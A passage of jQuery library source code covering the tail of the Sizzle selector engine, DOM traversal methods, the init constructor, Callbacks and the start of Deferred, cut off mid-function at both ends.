    if ( ( matcher = Expr.relative[ tokens[ i ].type ] ) ) {
        matchers = [ addCombinator( elementMatcher( matchers ), matcher ) ];
    } else {
        matcher = Expr.filter[ tokens[ i ].type ].apply( null, tokens[ i ].matches );

        // Return special upon seeing a positional matcher
        if ( matcher[ expando ] ) {

            // Find the next relative operator (if any) for proper handling
            j = ++i;
            for ( ; j < len; j++ ) {
                if ( Expr.relative[ tokens[ j ].type ] ) {
                    break;
                }
            }
            return setMatcher(
                i > 1 && elementMatcher( matchers ),
                i > 1 && toSelector(

                // If the preceding token was a descendant combinator, insert an implicit any-element `*`
                tokens
                    .slice( 0, i - 1 )
                    .concat( { value: tokens[ i - 2 ].type === " " ? "*" : "" } )
                ).replace( rtrim, "$1" ),
                matcher,
                i < j && matcherFromTokens( tokens.slice( i, j ) ),
                j < len && matcherFromTokens( ( tokens = tokens.slice( j ) ) ),
                j < len && toSelector( tokens )
            );
        }
        matchers.push( matcher );
    }
}

return elementMatcher( matchers );
}

function matcherFromGroupMatchers( elementMatchers, setMatchers ) {
var bySet = setMatchers.length > 0,
    byElement = elementMatchers.length > 0,
    superMatcher = function( seed, context, xml, results, outermost ) {
        var elem, j, matcher,
            matchedCount = 0,
            i = "0",
            unmatched = seed && [],
            setMatched = [],
            contextBackup = outermostContext,

            // We must always have either seed elements or outermost context
            elems = seed || byElement && Expr.find[ "TAG" ]( "*", outermost ),

            // Use integer dirruns iff this is the outermost matcher
            dirrunsUnique = ( dirruns += contextBackup == null ? 1 : Math.random() || 0.1 ),
            len = elems.length;

        if ( outermost ) {

            // Support: IE 11+, Edge 17 - 18+
            // IE/Edge sometimes throw a "Permission denied" error when strict-comparing
            // two documents; shallow comparisons work.
            // eslint-disable-next-line eqeqeq
            outermostContext = context == document || context || outermost;
        }

        // Add elements passing elementMatchers directly to results
        // Support: IE<9, Safari
        // Tolerate NodeList properties (IE: "length"; Safari: <number>) matching elements by id
        for ( ; i !== len && ( elem = elems[ i ] ) != null; i++ ) {
            if ( byElement && elem ) {
                j = 0;

                // Support: IE 11+, Edge 17 - 18+
                // IE/Edge sometimes throw a "Permission denied" error when strict-comparing
                // two documents; shallow comparisons work.
                // eslint-disable-next-line eqeqeq
                if ( !context && elem.ownerDocument != document ) {
                    setDocument( elem );
                    xml = !documentIsHTML;
                }
                while ( ( matcher = elementMatchers[ j++ ] ) ) {
                    if ( matcher( elem, context || document, xml ) ) {
                        results.push( elem );
                        break;
                    }
                }
                if ( outermost ) {
                    dirruns = dirrunsUnique;
                }
            }

            // Track unmatched elements for set filters
            if ( bySet ) {

                // They will have gone through all possible matchers
                if ( ( elem = !matcher && elem ) ) {
                    matchedCount--;
                }

                // Lengthen the array for every element, matched or not
                if ( seed ) {
                    unmatched.push( elem );
                }
            }
        }

        // `i` is now the count of elements visited above, and adding it to `matchedCount`
        // makes the latter nonnegative.
        matchedCount += i;

        // Apply set filters to unmatched elements
        // NOTE: This can be skipped if there are no unmatched elements (i.e., `matchedCount`
        // equals `i`), unless we didn't visit _any_ elements in the above loop because we have
        // no element matchers and no seed.
        // Incrementing an initially-string "0" `i` allows `i` to remain a string only in that
        // case, which will result in a "00" `matchedCount` that differs from `i` but is also
        // numerically zero.
        if ( bySet && i !== matchedCount ) {
            j = 0;
            while ( ( matcher = setMatchers[ j++ ] ) ) {
                matcher( unmatched, setMatched, context, xml );
            }

            if ( seed ) {

                // Reintegrate element matches to eliminate the need for sorting
                if ( matchedCount > 0 ) {
                    while ( i-- ) {
                        if ( !( unmatched[ i ] || setMatched[ i ] ) ) {
                            setMatched[ i ] = pop.call( results );
                        }
                    }
                }

                // Discard index placeholder values to get only actual matches
                setMatched = condense( setMatched );
            }

            // Add matches to results
            push.apply( results, setMatched );

            // Seedless set matches succeeding multiple successful matchers stipulate sorting
            if ( outermost && !seed && setMatched.length > 0 &&
                ( matchedCount + setMatchers.length ) > 1 ) {

                Sizzle.uniqueSort( results );
            }
        }

        // Override manipulation of globals by nested matchers
        if ( outermost ) {
            dirruns = dirrunsUnique;
            outermostContext = contextBackup;
        }

        return unmatched;
    };

return bySet ?
    markFunction( superMatcher ) :
    superMatcher;
}

compile = Sizzle.compile = function( selector, match /* Internal Use Only */ ) {
var i,
    setMatchers = [],
    elementMatchers = [],
    cached = compilerCache[ selector + " " ];

if ( !cached ) {

    // Generate a function of recursive functions that can be used to check each element
    if ( !match ) {
        match = tokenize( selector );
    }
    i = match.length;
    while ( i-- ) {
        cached = matcherFromTokens( match[ i ] );
        if ( cached[ expando ] ) {
            setMatchers.push( cached );
        } else {
            elementMatchers.push( cached );
        }
    }

    // Cache the compiled function
    cached = compilerCache(
        selector,
        matcherFromGroupMatchers( elementMatchers, setMatchers )
    );

    // Save selector and tokenization
    cached.selector = selector;
}
return cached;
};

/**
* A low-level selection function that works with Sizzle's compiled
*  selector functions
* @param {String|Function} selector A selector or a pre-compiled
*  selector function built with Sizzle.compile
* @param {Element} context
* @param {Array} [results]
* @param {Array} [seed] A set of elements to match against
*/
select = Sizzle.select = function( selector, context, results, seed ) {
var i, tokens, token, type, find,
    compiled = typeof selector === "function" && selector,
    match = !seed && tokenize( ( selector = compiled.selector || selector ) );

results = results || [];

// Try to minimize operations if there is only one selector in the list and no seed
// (the latter of which guarantees us context)
if ( match.length === 1 ) {

    // Reduce context if the leading compound selector is an ID
    tokens = match[ 0 ] = match[ 0 ].slice( 0 );
    if ( tokens.length > 2 && ( token = tokens[ 0 ] ).type === "ID" &&
        context.nodeType === 9 && documentIsHTML && Expr.relative[ tokens[ 1 ].type ] ) {

        context = ( Expr.find[ "ID" ]( token.matches[ 0 ]
            .replace( runescape, funescape ), context ) || [] )[ 0 ];
        if ( !context ) {
            return results;

        // Precompiled matchers will still verify ancestry, so step up a level
        } else if ( compiled ) {
            context = context.parentNode;
        }

        selector = selector.slice( tokens.shift().value.length );
    }

    // Fetch a seed set for right-to-left matching
    i = matchExpr[ "needsContext" ].test( selector ) ? 0 : tokens.length;
    while ( i-- ) {
        token = tokens[ i ];

        // Abort if we hit a combinator
        if ( Expr.relative[ ( type = token.type ) ] ) {
            break;
        }
        if ( ( find = Expr.find[ type ] ) ) {

            // Search, expanding context for leading sibling combinators
            if ( ( seed = find(
                token.matches[ 0 ].replace( runescape, funescape ),
                rsibling.test( tokens[ 0 ].type ) && testContext( context.parentNode ) ||
                    context
            ) ) ) {

                // If seed is empty or no tokens remain, we can return early
                tokens.splice( i, 1 );
                selector = seed.length && toSelector( tokens );
                if ( !selector ) {
                    push.apply( results, seed );
                    return results;
                }

                break;
            }
        }
    }
}

// Compile and execute a filtering function if one is not provided
// Provide `match` to avoid retokenization if we modified the selector above
( compiled || compile( selector, match ) )(
    seed,
    context,
    !documentIsHTML,
    results,
    !context || rsibling.test( selector ) && testContext( context.parentNode ) || context
);
return results;
};

// One-time assignments

// Sort stability
support.sortStable = expando.split( "" ).sort( sortOrder ).join( "" ) === expando;

// Support: Chrome 14-35+
// Always assume duplicates if they aren't passed to the comparison function
support.detectDuplicates = !!hasDuplicate;

// Initialize against the default document
setDocument();

// Support: Webkit<537.32 - Safari 6.0.3/Chrome 25 (fixed in Chrome 27)
// Detached nodes confoundingly follow *each other*
support.sortDetached = assert( function( el ) {

// Should return 1, but returns 4 (following)
return el.compareDocumentPosition( document.createElement( "fieldset" ) ) & 1;
} );

// Support: IE<8
// Prevent attribute/property "interpolation"
// https://msdn.microsoft.com/en-us/library/ms536429%28VS.85%29.aspx
if ( !assert( function( el ) {
el.innerHTML = "<a href='#'></a>";
return el.firstChild.getAttribute( "href" ) === "#";
} ) ) {
addHandle( "type|href|height|width", function( elem, name, isXML ) {
    if ( !isXML ) {
        return elem.getAttribute( name, name.toLowerCase() === "type" ? 1 : 2 );
    }
} );
}

// Support: IE<9
// Use defaultValue in place of getAttribute("value")
if ( !support.attributes || !assert( function( el ) {
el.innerHTML = "<input/>";
el.firstChild.setAttribute( "value", "" );
return el.firstChild.getAttribute( "value" ) === "";
} ) ) {
addHandle( "value", function( elem, _name, isXML ) {
    if ( !isXML && elem.nodeName.toLowerCase() === "input" ) {
        return elem.defaultValue;
    }
} );
}

// Support: IE<9
// Use getAttributeNode to fetch booleans when getAttribute lies
if ( !assert( function( el ) {
return el.getAttribute( "disabled" ) == null;
} ) ) {
addHandle( booleans, function( elem, name, isXML ) {
    var val;
    if ( !isXML ) {
        return elem[ name ] === true ? name.toLowerCase() :
            ( val = elem.getAttributeNode( name ) ) && val.specified ?
                val.value :
                null;
    }
} );
}

return Sizzle;

} )( window );



jQuery.find = Sizzle;
jQuery.expr = Sizzle.selectors;

// Deprecated
jQuery.expr[ ":" ] = jQuery.expr.pseudos;
jQuery.uniqueSort = jQuery.unique = Sizzle.uniqueSort;
jQuery.text = Sizzle.getText;
jQuery.isXMLDoc = Sizzle.isXML;
jQuery.contains = Sizzle.contains;
jQuery.escapeSelector = Sizzle.escape;




var dir = function( elem, dir, until ) {
var matched = [],
    truncate = until !== undefined;

while ( ( elem = elem[ dir ] ) && elem.nodeType !== 9 ) {
    if ( elem.nodeType === 1 ) {
        if ( truncate && jQuery( elem ).is( until ) ) {
            break;
        }
        matched.push( elem );
    }
}
return matched;
};


var siblings = function( n, elem ) {
var matched = [];

for ( ; n; n = n.nextSibling ) {
    if ( n.nodeType === 1 && n !== elem ) {
        matched.push( n );
    }
}

return matched;
};


var rneedsContext = jQuery.expr.match.needsContext;



function nodeName( elem, name ) {

return elem.nodeName && elem.nodeName.toLowerCase() === name.toLowerCase();

}
var rsingleTag = ( /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i );



// Implement the identical functionality for filter and not
function winnow( elements, qualifier, not ) {
if ( isFunction( qualifier ) ) {
    return jQuery.grep( elements, function( elem, i ) {
        return !!qualifier.call( elem, i, elem ) !== not;
    } );
}

// Single element
if ( qualifier.nodeType ) {
    return jQuery.grep( elements, function( elem ) {
        return ( elem === qualifier ) !== not;
    } );
}

// Arraylike of elements (jQuery, arguments, Array)
if ( typeof qualifier !== "string" ) {
    return jQuery.grep( elements, function( elem ) {
        return ( indexOf.call( qualifier, elem ) > -1 ) !== not;
    } );
}

// Filtered directly for both simple and complex selectors
return jQuery.filter( qualifier, elements, not );
}

jQuery.filter = function( expr, elems, not ) {
var elem = elems[ 0 ];

if ( not ) {
    expr = ":not(" + expr + ")";
}

if ( elems.length === 1 && elem.nodeType === 1 ) {
    return jQuery.find.matchesSelector( elem, expr ) ? [ elem ] : [];
}

return jQuery.find.matches( expr, jQuery.grep( elems, function( elem ) {
    return elem.nodeType === 1;
} ) );
};

jQuery.fn.extend( {
find: function( selector ) {
    var i, ret,
        len = this.length,
        self = this;

    if ( typeof selector !== "string" ) {
        return this.pushStack( jQuery( selector ).filter( function() {
            for ( i = 0; i < len; i++ ) {
                if ( jQuery.contains( self[ i ], this ) ) {
                    return true;
                }
            }
        } ) );
    }

    ret = this.pushStack( [] );

    for ( i = 0; i < len; i++ ) {
        jQuery.find( selector, self[ i ], ret );
    }

    return len > 1 ? jQuery.uniqueSort( ret ) : ret;
},
filter: function( selector ) {
    return this.pushStack( winnow( this, selector || [], false ) );
},
not: function( selector ) {
    return this.pushStack( winnow( this, selector || [], true ) );
},
is: function( selector ) {
    return !!winnow(
        this,

        // If this is a positional/relative selector, check membership in the returned set
        // so $("p:first").is("p:last") won't return true for a doc with two "p".
        typeof selector === "string" && rneedsContext.test( selector ) ?
            jQuery( selector ) :
            selector || [],
        false
    ).length;
}
} );


// Initialize a jQuery object


// A central reference to the root jQuery(document)
var rootjQuery,

// A simple way to check for HTML strings
// Prioritize #id over <tag> to avoid XSS via location.hash (#9521)
// Strict HTML recognition (#11290: must start with <)
// Shortcut simple #id case for speed
rquickExpr = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/,

init = jQuery.fn.init = function( selector, context, root ) {
    var match, elem;

    // HANDLE: $(""), $(null), $(undefined), $(false)
    if ( !selector ) {
        return this;
    }

    // Method init() accepts an alternate rootjQuery
    // so migrate can support jQuery.sub (gh-2101)
    root = root || rootjQuery;

    // Handle HTML strings
    if ( typeof selector === "string" ) {
        if ( selector[ 0 ] === "<" &&
            selector[ selector.length - 1 ] === ">" &&
            selector.length >= 3 ) {

            // Assume that strings that start and end with <> are HTML and skip the regex check
            match = [ null, selector, null ];

        } else {
            match = rquickExpr.exec( selector );
        }

        // Match html or make sure no context is specified for #id
        if ( match && ( match[ 1 ] || !context ) ) {

            // HANDLE: $(html) -> $(array)
            if ( match[ 1 ] ) {
                context = context instanceof jQuery ? context[ 0 ] : context;

                // Option to run scripts is true for back-compat
                // Intentionally let the error be thrown if parseHTML is not present
                jQuery.merge( this, jQuery.parseHTML(
                    match[ 1 ],
                    context && context.nodeType ? context.ownerDocument || context : document,
                    true
                ) );

                // HANDLE: $(html, props)
                if ( rsingleTag.test( match[ 1 ] ) && jQuery.isPlainObject( context ) ) {
                    for ( match in context ) {

                        // Properties of context are called as methods if possible
                        if ( isFunction( this[ match ] ) ) {
                            this[ match ]( context[ match ] );

                        // ...and otherwise set as attributes
                        } else {
                            this.attr( match, context[ match ] );
                        }
                    }
                }

                return this;

            // HANDLE: $(#id)
            } else {
                elem = document.getElementById( match[ 2 ] );

                if ( elem ) {

                    // Inject the element directly into the jQuery object
                    this[ 0 ] = elem;
                    this.length = 1;
                }
                return this;
            }

        // HANDLE: $(expr, $(...))
        } else if ( !context || context.jquery ) {
            return ( context || root ).find( selector );

        // HANDLE: $(expr, context)
        // (which is just equivalent to: $(context).find(expr)
        } else {
            return this.constructor( context ).find( selector );
        }

    // HANDLE: $(DOMElement)
    } else if ( selector.nodeType ) {
        this[ 0 ] = selector;
        this.length = 1;
        return this;

    // HANDLE: $(function)
    // Shortcut for document ready
    } else if ( isFunction( selector ) ) {
        return root.ready !== undefined ?
            root.ready( selector ) :

            // Execute immediately if ready is not present
            selector( jQuery );
    }

    return jQuery.makeArray( selector, this );
};

// Give the init function the jQuery prototype for later instantiation
init.prototype = jQuery.fn;

// Initialize central reference
rootjQuery = jQuery( document );


var rparentsprev = /^(?:parents|prev(?:Until|All))/,

// Methods guaranteed to produce a unique set when starting from a unique set
guaranteedUnique = {
    children: true,
    contents: true,
    next: true,
    prev: true
};

jQuery.fn.extend( {
has: function( target ) {
    var targets = jQuery( target, this ),
        l = targets.length;

    return this.filter( function() {
        var i = 0;
        for ( ; i < l; i++ ) {
            if ( jQuery.contains( this, targets[ i ] ) ) {
                return true;
            }
        }
    } );
},

closest: function( selectors, context ) {
    var cur,
        i = 0,
        l = this.length,
        matched = [],
        targets = typeof selectors !== "string" && jQuery( selectors );

    // Positional selectors never match, since there's no _selection_ context
    if ( !rneedsContext.test( selectors ) ) {
        for ( ; i < l; i++ ) {
            for ( cur = this[ i ]; cur && cur !== context; cur = cur.parentNode ) {

                // Always skip document fragments
                if ( cur.nodeType < 11 && ( targets ?
                    targets.index( cur ) > -1 :

                    // Don't pass non-elements to Sizzle
                    cur.nodeType === 1 &&
                        jQuery.find.matchesSelector( cur, selectors ) ) ) {

                    matched.push( cur );
                    break;
                }
            }
        }
    }

    return this.pushStack( matched.length > 1 ? jQuery.uniqueSort( matched ) : matched );
},

// Determine the position of an element within the set
index: function( elem ) {

    // No argument, return index in parent
    if ( !elem ) {
        return ( this[ 0 ] && this[ 0 ].parentNode ) ? this.first().prevAll().length : -1;
    }

    // Index in selector
    if ( typeof elem === "string" ) {
        return indexOf.call( jQuery( elem ), this[ 0 ] );
    }

    // Locate the position of the desired element
    return indexOf.call( this,

        // If it receives a jQuery object, the first element is used
        elem.jquery ? elem[ 0 ] : elem
    );
},

add: function( selector, context ) {
    return this.pushStack(
        jQuery.uniqueSort(
            jQuery.merge( this.get(), jQuery( selector, context ) )
        )
    );
},

addBack: function( selector ) {
    return this.add( selector == null ?
        this.prevObject : this.prevObject.filter( selector )
    );
}
} );

function sibling( cur, dir ) {
while ( ( cur = cur[ dir ] ) && cur.nodeType !== 1 ) {}
return cur;
}

jQuery.each( {
parent: function( elem ) {
    var parent = elem.parentNode;
    return parent && parent.nodeType !== 11 ? parent : null;
},
parents: function( elem ) {
    return dir( elem, "parentNode" );
},
parentsUntil: function( elem, _i, until ) {
    return dir( elem, "parentNode", until );
},
next: function( elem ) {
    return sibling( elem, "nextSibling" );
},
prev: function( elem ) {
    return sibling( elem, "previousSibling" );
},
nextAll: function( elem ) {
    return dir( elem, "nextSibling" );
},
prevAll: function( elem ) {
    return dir( elem, "previousSibling" );
},
nextUntil: function( elem, _i, until ) {
    return dir( elem, "nextSibling", until );
},
prevUntil: function( elem, _i, until ) {
    return dir( elem, "previousSibling", until );
},
siblings: function( elem ) {
    return siblings( ( elem.parentNode || {} ).firstChild, elem );
},
children: function( elem ) {
    return siblings( elem.firstChild );
},
contents: function( elem ) {
    if ( elem.contentDocument != null &&

        // Support: IE 11+
        // <object> elements with no `data` attribute has an object
        // `contentDocument` with a `null` prototype.
        getProto( elem.contentDocument ) ) {

        return elem.contentDocument;
    }

    // Support: IE 9 - 11 only, iOS 7 only, Android Browser <=4.3 only
    // Treat the template element as a regular one in browsers that
    // don't support it.
    if ( nodeName( elem, "template" ) ) {
        elem = elem.content || elem;
    }

    return jQuery.merge( [], elem.childNodes );
}
}, function( name, fn ) {
jQuery.fn[ name ] = function( until, selector ) {
    var matched = jQuery.map( this, fn, until );

    if ( name.slice( -5 ) !== "Until" ) {
        selector = until;
    }

    if ( selector && typeof selector === "string" ) {
        matched = jQuery.filter( selector, matched );
    }

    if ( this.length > 1 ) {

        // Remove duplicates
        if ( !guaranteedUnique[ name ] ) {
            jQuery.uniqueSort( matched );
        }

        // Reverse order for parents* and prev-derivatives
        if ( rparentsprev.test( name ) ) {
            matched.reverse();
        }
    }

    return this.pushStack( matched );
};
} );
var rnothtmlwhite = ( /[^\x20\t\r\n\f]+/g );



// Convert String-formatted options into Object-formatted ones
function createOptions( options ) {
var object = {};
jQuery.each( options.match( rnothtmlwhite ) || [], function( _, flag ) {
    object[ flag ] = true;
} );
return object;
}

/*
* Create a callback list using the following parameters:
*
*	options: an optional list of space-separated options that will change how
*			the callback list behaves or a more traditional option object
*
* By default a callback list will act like an event callback list and can be
* "fired" multiple times.
*
* Possible options:
*
*	once:			will ensure the callback list can only be fired once (like a Deferred)
*
*	memory:			will keep track of previous values and will call any callback added
*					after the list has been fired right away with the latest "memorized"
*					values (like a Deferred)
*
*	unique:			will ensure a callback can only be added once (no duplicate in the list)
*
*	stopOnFalse:	interrupt callings when a callback returns false
*
*/
jQuery.Callbacks = function( options ) {

// Convert options from String-formatted to Object-formatted if needed
// (we check in cache first)
options = typeof options === "string" ?
    createOptions( options ) :
    jQuery.extend( {}, options );

var // Flag to know if list is currently firing
    firing,

    // Last fire value for non-forgettable lists
    memory,

    // Flag to know if list was already fired
    fired,

    // Flag to prevent firing
    locked,

    // Actual callback list
    list = [],

    // Queue of execution data for repeatable lists
    queue = [],

    // Index of currently firing callback (modified by add/remove as needed)
    firingIndex = -1,

    // Fire callbacks
    fire = function() {

        // Enforce single-firing
        locked = locked || options.once;

        // Execute callbacks for all pending executions,
        // respecting firingIndex overrides and runtime changes
        fired = firing = true;
        for ( ; queue.length; firingIndex = -1 ) {
            memory = queue.shift();
            while ( ++firingIndex < list.length ) {

                // Run callback and check for early termination
                if ( list[ firingIndex ].apply( memory[ 0 ], memory[ 1 ] ) === false &&
                    options.stopOnFalse ) {

                    // Jump to end and forget the data so .add doesn't re-fire
                    firingIndex = list.length;
                    memory = false;
                }
            }
        }

        // Forget the data if we're done with it
        if ( !options.memory ) {
            memory = false;
        }

        firing = false;

        // Clean up if we're done firing for good
        if ( locked ) {

            // Keep an empty list if we have data for future add calls
            if ( memory ) {
                list = [];

            // Otherwise, this object is spent
            } else {
                list = "";
            }
        }
    },

    // Actual Callbacks object
    self = {

        // Add a callback or a collection of callbacks to the list
        add: function() {
            if ( list ) {

                // If we have memory from a past run, we should fire after adding
                if ( memory && !firing ) {
                    firingIndex = list.length - 1;
                    queue.push( memory );
                }

                ( function add( args ) {
                    jQuery.each( args, function( _, arg ) {
                        if ( isFunction( arg ) ) {
                            if ( !options.unique || !self.has( arg ) ) {
                                list.push( arg );
                            }
                        } else if ( arg && arg.length && toType( arg ) !== "string" ) {

                            // Inspect recursively
                            add( arg );
                        }
                    } );
                } )( arguments );

                if ( memory && !firing ) {
                    fire();
                }
            }
            return this;
        },

        // Remove a callback from the list
        remove: function() {
            jQuery.each( arguments, function( _, arg ) {
                var index;
                while ( ( index = jQuery.inArray( arg, list, index ) ) > -1 ) {
                    list.splice( index, 1 );

                    // Handle firing indexes
                    if ( index <= firingIndex ) {
                        firingIndex--;
                    }
                }
            } );
            return this;
        },

        // Check if a given callback is in the list.
        // If no argument is given, return whether or not list has callbacks attached.
        has: function( fn ) {
            return fn ?
                jQuery.inArray( fn, list ) > -1 :
                list.length > 0;
        },

        // Remove all callbacks from the list
        empty: function() {
            if ( list ) {
                list = [];
            }
            return this;
        },

        // Disable .fire and .add
        // Abort any current/pending executions
        // Clear all callbacks and values
        disable: function() {
            locked = queue = [];
            list = memory = "";
            return this;
        },
        disabled: function() {
            return !list;
        },

        // Disable .fire
        // Also disable .add unless we have memory (since it would have no effect)
        // Abort any pending executions
        lock: function() {
            locked = queue = [];
            if ( !memory && !firing ) {
                list = memory = "";
            }
            return this;
        },
        locked: function() {
            return !!locked;
        },

        // Call all callbacks with the given context and arguments
        fireWith: function( context, args ) {
            if ( !locked ) {
                args = args || [];
                args = [ context, args.slice ? args.slice() : args ];
                queue.push( args );
                if ( !firing ) {
                    fire();
                }
            }
            return this;
        },

        // Call all the callbacks with the given arguments
        fire: function() {
            self.fireWith( this, arguments );
            return this;
        },

        // To know if the callbacks have already been called at least once
        fired: function() {
            return !!fired;
        }
    };

return self;
};


function Identity( v ) {
return v;
}
function Thrower( ex ) {
throw ex;
}

function adoptValue( value, resolve, reject, noValue ) {
var method;

try {

    // Check for promise aspect first to privilege synchronous behavior
    if ( value && isFunction( ( method = value.promise ) ) ) {
        method.call( value ).done( resolve ).fail( reject );

    // Other thenables
    } else if ( value && isFunction( ( method = value.then ) ) ) {
        method.call( value, resolve, reject );

    // Other non-thenables
    } else {

        // Control `resolve` arguments by letting Array#slice cast boolean `noValue` to integer:
        // * false: [ value ].slice( 0 ) => resolve( value )
        // * true: [ value ].slice( 1 ) => resolve()
        resolve.apply( undefined, [ value ].slice( noValue ) );
    }

// For Promises/A+, convert exceptions into rejections
// Since jQuery.when doesn't unwrap thenables, we can skip the extra checks appearing in
// Deferred#then to conditionally suppress rejection.
} catch ( value ) {

    // Support: Android 4.0 only
    // Strict mode functions invoked without .call/.apply get global-object context
    reject.apply( undefined, [ value ] );
}
}

jQuery.extend( {

Deferred: function( func ) {
    var tuples = [

            // action, add listener, callbacks,
            // ... .then handlers, argument index, [final state]
            [ "notify", "progress", jQuery.Callbacks( "memory" ),
                jQuery.Callbacks( "memory" ), 2 ],
            [ "resolve", "done", jQuery.Callbacks( "once memory" ),
                jQuery.Callbacks( "once memory" ), 0, "resolved" ],
            [ "reject", "fail", jQuery.Callbacks( "once memory" ),
                jQuery.Callbacks( "once memory" ), 1, "rejected" ]
        ],
        state = "pending",
        promise = {
            state: function() {
                return state;
            },
            always: function() {
                deferred.done( arguments ).fail( arguments );
                return this;
            },
            "catch": function( fn ) {
                return promise.then( null, fn );
            },

            // Keep pipe for back-compat
            pipe: function( /* fnDone, fnFail, fnProgress */ ) {
                var fns = arguments;

                return jQuery.Deferred( function( newDefer ) {
                    jQuery.each( tuples, function( _i, tuple ) {

                        // Map tuples (progress, done, fail) to arguments (done, fail, progress)
                        var fn = isFunction( fns[ tuple[ 4 ] ] ) && fns[ tuple[ 4 ] ];

                        // deferred.progress(function() { bind to newDefer or newDefer.notify })
                        // deferred.done(function() { bind to newDefer or newDefer.resolve })
                        // deferred.fail(function() { bind to newDefer or newDefer.reject })
                        deferred[ tuple[ 1 ] ]( function() {
                            var returned = fn && fn.apply( this, arguments );
                            if ( returned && isFunction( returned.promise ) ) {
                                returned.promise()
                                    .progress( newDefer.notify )
                                    .done( newDefer.resolve )
                                    .fail( newDefer.reject );
                            } else {
                                newDefer[ tuple[ 0 ] + "With" ](
                                    this,
                                    fn ? [ returned ] : arguments
                                );
                            }
                        } );
                    } );
                    fns = null;
                } ).promise();
            },
            then: function( onFulfilled, onRejected, onProgress ) {
                var maxDepth = 0;
                function resolve( depth, deferred, handler, special ) {
                    return function() {
                        var that = this,
                            args = arguments,
                            mightThrow = function() {
                                var returned, then;

                                // Support: Promises/A+ section 2.3.3.3.3
                                // https://promisesaplus.com/#point-59
                                // Ignore double-resolution attempts
                                if ( depth < maxDepth ) {
                                    return;
                                }

                                returned = handler.apply( that, args );

                                // Support: Promises/A+ section 2.3.1
                                // https://promisesaplus.com/#point-48
                                if ( returned === deferred.promise() ) {
                                    throw new TypeError( "Thenable self-resolution" );
                                }

                                // Support: Promises/A+ sections 2.3.3.1, 3.5
                                // https://promisesaplus.com/#point-54
                                // https://promisesaplus.com/#point-75
                                // Retrieve `then` only once
                                then = returned &&

                                    // Support: Promises/A+ section 2.3.4
                                    // https://promisesaplus.com/#point-64
                                    // Only check objects and functions for thenability
                                    ( typeof returned === "object" ||
                                        typeof returned === "function" ) &&
                                    returned.then;

                                // Handle a returned thenable
                                if ( isFunction( then ) ) {

                                    // Special processors (notify) just wait for resolution
                                    if ( special ) {
                                        then.call(
                                            returned,
                                            resolve( maxDepth, deferred, Identity, special ),
                                            resolve( maxDepth, deferred, Thrower, special )
                                        );

                                    // Normal processors (resolve) also hook into progress
                                    } else {

                                        // ...and disregard older resolution values
                                        maxDepth++;

                                        then.call(
                                            returned,
                                            resolve( maxDepth, deferred, Identity, special ),
                                            resolve( maxDepth, deferred, Thrower, special ),
                                            resolve( maxDepth, deferred, Identity,
                                                deferred.notifyWith )
                                        );
                                    }

                                // Handle all other returned values
                                } else {

                                    // Only substitute handlers pass on context
                                    // and multiple values (non-spec behavior)
                                    if ( handler !== Identity ) {
                                        that = undefined;
                                        args = [ returned ];
                                    }

                                    // Process the value(s)
                                    // Default process is resolve
                                    ( special || deferred.resolveWith )( that, args );
                                }
                            },

                            // Only normal processors (resolve) catch and reject exceptions
                            process = special ?
                                mightThrow :
                                function() {
                                    try {
                                        mightThrow();
                                    } catch ( e ) {

                                        if ( jQuery.Deferred.exceptionHook ) {
                                            jQuery.Deferred.exceptionHook( e,
                                                process.stackTrace );
                                        }

                                        // Support: Promises/A+ section 2.3.3.3.4.1
                                        // https://promisesaplus.com/#point-61
                                        // Ignore post-resolution exceptions
                                        if ( depth + 1 >= maxDepth ) {

                                            // Only substitute handlers pass on context
                                            // and multiple values (non-spec behavior)
                                            if ( handler !== Thrower ) {
                                                that = undefined;
                                                args = [ e ];
                                            }

                                            deferred.rejectWith( that, args );
                                        }
                                    }
                                };

                        // Support: Promises/A+ section 2.3.3.3.1
                        // https://promisesaplus.com/#point-57
                        // Re-resolve promises immediately to dodge false rejection from
                        // subsequent errors
                        if ( depth ) {
                            process();
                        } else {

                            // Call an optional hook to record the stack, in case of exception
                            // since it's otherwise lost when execution goes async
                            if ( jQuery.Deferred.getStackHook ) {
                                process.stackTrace = jQuery.Deferred.getStackHook();
                            }
                            window.setTimeout( process );
                        }
                    };
                }

                return jQuery.Deferred( function( newDefer ) {

                    // progress_handlers.add( ... )
                    tuples[ 0 ][ 3 ].add(
                        resolve(
                            0,
                            newDefer,
                            isFunction( onProgress ) ?
                                onProgress :
                                Identity,
                            newDefer.notifyWith
                        )
                    );

                    // fulfilled_handlers.add( ... )
                    tuples[ 1 ][ 3 ].add(
                        resolve(
                            0,
                            newDefer,
                            isFunction( onFulfilled ) ?
                                onFulfilled :
                                Identity
                        )
                    );

                    // rejected_handlers.add( ... )
                    tuples[ 2 ][ 3 ].add(
                        resolve(
                            0,
                            newDefer,
                            isFunction( onRejected ) ?
                                onRejected :
                                Thrower
                        )
                    );
                } ).promise();
            },

            // Get a promise for this deferred
            // If obj is provided, the promise aspect is added to the object
            promise: function( obj ) {
                return obj != null ? jQuery.extend( obj, promise ) : promise;
            }
        },
        deferred = {};

    // Add list-specific methods
    jQuery.each( tuples, function( i, tuple ) {
        var list = tuple[ 2 ],
            stateString = tuple[ 5 ];

        // promise.progress = list.add
        // promise.done = list.add
        // promise.fail = list.add
        promise[ tuple[ 1 ] ] = list.add;

        // Handle state
        if ( stateString ) {
            list.add(
                function() {

                    // state = "resolved" (i.e., fulfilled)
                    // state = "rejected"
                    state = stateString;
                },

                // rejected_callbacks.disable
                // fulfilled_callbacks.disable
                tuples[ 3 - i ][ 2 ].disable,

                // rejected_handlers.disable
                // fulfilled_handlers.disable
                tuples[ 3 - i ][ 3 ].disable,

                // progress_callbacks.lock
                tuples[ 0 ][ 2 ].lock,

                // progress_handlers.lock
                tuples[ 0 ][ 3 ].lock
            );
        }

        // progress_handlers.fire
        // fulfilled_handlers.fire
        // rejected_handlers.fire
        list.add( tuple[ 3 ].fire );

        // deferred.notify = function() { deferred.notifyWith(...) }
        // deferred.resolve = function() { deferred.resolveWith(...) }
        // deferred.reject = function() { deferred.rejectWith(...) }
        deferred[ tuple[ 0 ] ] = function() {
            deferred[ tuple[ 0 ] + "With" ]( this === deferred ? undefined : this, arguments );
            return this;
        };

        // deferred.notifyWith = list.fireWith
        // deferred.resolveWith = list.fireWith
        // deferred.rejectWith = list.fireWith
        deferred[ tuple[ 0 ] + "With" ] = list.fireWith;
    } );

    // Make the deferred a promise
    promise.promise( deferred );

    // Call given func if any
    if ( func ) {
        func.call( deferred, deferred );
    }

    // All done!
    return deferred;
